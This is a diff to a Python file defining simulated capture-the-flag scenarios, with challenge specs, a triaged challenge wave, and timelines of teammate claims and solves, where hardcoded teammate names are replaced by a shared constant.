 DEEP_ARCHIVE = Spec(
     "deep-archive", "for", "Deep Archive", 400, "We imaged the archive server before it died. Twelve gigabytes of mostly nothing.",
@@ -621,7 +891,7 @@ DEEP_ARCHIVE = Spec(
 )
 
 # The triaged wave: the three pathological lanes first, then the rest, cheapest first.
-WAVE = (GEARBOX, QUIET_LEDGER, DEEP_ARCHIVE, *sorted(WAVE_GENERIC, key=lambda s: (s.points, s.category, s.name)))
+WAVE = (RATCHET_RUN, QUIET_LEDGER, DEEP_ARCHIVE, *sorted(WAVE_GENERIC, key=lambda s: (s.points, s.category, s.name)))
 assert len(WAVE) == 43
 
 FIRST_LIGHT = Spec("first-light", "misc", "First Light", 10, "The flag is in the rules. Read them!", solves=412, status=ChallengeStatus.SOLVED, solved_by=ME)
@@ -683,6 +953,7 @@ def _small(name: str, summary: str, special: Spec, extra: tuple[str, ...], **kw)
 
 def default() -> Scenario:
     specs = (*EARLY, *WAVE)
+    first, second = TEAMMATES
     return Scenario(
         name="default",
         summary="An event in progress: every cue below on one board, then a 43-challenge wave drops",
@@ -690,9 +961,9 @@ def default() -> Scenario:
         timeline=(
             (0, ReleaseAt(_ids(EARLY), "Board")),
             (36, ReleaseAt(_ids(WAVE), "Wave 2")),
-            (40, TeammateClaim("lucky-sevens", "delta")),
-            (50, TeammateSolve("night-shift", "bravo")),
-            (64, TeammateSolve("parcel-tracker", "bravo")),
+            (40, TeammateClaim("lucky-sevens", second)),
+            (50, TeammateSolve("night-shift", first)),
+            (64, TeammateSolve("parcel-tracker", first)),
         ),
         team=True,
         prerun=32,
@@ -723,7 +994,7 @@ def overthinking() -> Scenario:
         "overthinking",
         "A 50-pointer that 300 teams solved, at 40 turns and counting",
         SECOND_GUESS,
-        ("tin-soldier", "postcard", "form-letter"),
+        ("tin-soldier", "holiday-snap", "form-letter"),
         prerun=34,
     )
 
@@ -738,16 +1009,17 @@ def web() -> Scenario:
 
 
 def team() -> Scenario:
-    specs = (NIGHT_SHIFT, HARBOR_MASTER, *(s for s in WAVE_GENERIC if s.id in ("lucky-sevens", "bent-coin", "tollbooth", "origami", "postcard")))
+    first, second = TEAMMATES
+    specs = (NIGHT_SHIFT, HARBOR_MASTER, *(s for s in WAVE_GENERIC if s.id in ("lucky-sevens", "bent-coin", "tollbooth", "origami", "holiday-snap")))
     return Scenario(
         name="team",
         summary="Team mode: a teammate solves a challenge a lane is on, and holds another's live box",
         specs=specs,
         timeline=(
             (0, ReleaseAt(_ids(specs), "Board")),
-            (4, TeammateClaim("postcard", "delta")),
-            (12, TeammateSolve("night-shift", "bravo")),
-            (20, TeammateSolve("lucky-sevens", "bravo")),
+            (4, TeammateClaim("holiday-snap", second)),
+            (12, TeammateSolve("night-shift", first)),
+            (20, TeammateSolve("lucky-sevens", first)),
         ),
         team=True,
         max_lanes=4,
